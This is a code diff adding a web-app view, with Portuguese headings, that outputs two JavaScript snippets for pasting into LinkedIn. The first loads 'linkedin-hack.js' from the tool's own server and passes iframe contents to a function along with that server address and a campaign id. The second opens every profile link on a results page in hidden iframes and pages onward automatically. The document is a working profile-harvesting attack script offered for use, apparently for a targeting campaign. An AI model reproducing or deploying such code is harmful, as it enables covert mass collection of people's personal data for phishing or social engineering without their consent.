@@ -1,0 +1,27 @@
+<h3>Parte 1</h3>
+<pre>
+  var script = document.createElement('script');
+  script.type = 'text/javascript';
+  script.src = '<%= request.protocol + request.host_with_port %>/linkedin-hack.js';
+  document.body.appendChild(script);
+
+  function iframeLoaded(iframe) {
+    fncGetInfo($("#ifrm" + iframe).contents(), '<%= request.protocol + request.host_with_port %>', '<%= @campaign.id %>');
+    }
+</pre>
+<br />
+<h3>Parte 2</h3>
+<pre>
+<%
+  code = "function fncPeople(){" + "\n"
+  code << "var ppl = $('a.img-wrapper');" + "\n"
+  code << "window.remain = ppl.length;" + "\n"
+  code << "window.profileLoaded = function() { window.remain--; if (remain === 0) {  setTimeout(fncPeople, 5000); $('a.page-link[title=|Next Page|]').click(); $('iframe.iframe1').remove(); setTimeout(fncPeople, 30000); } }" + "\n"
+  code << "$.each(ppl, function(i,r) {" + "\n"
+  code << " $('body').append($('<iframe style=|width: 200px; height: 200px; margin: 10px; float: left| src=|'+$(r).attr('href')+'| onload=|iframeLoaded('+i+');window.profileLoaded();| id=|ifrm'+i+'| class='iframe1'></iframe>'));" + "\n"
+  code << "})};fncPeople();"
+  %>
+
+<%=code.gsub('|', '"')%>
+
+</pre>
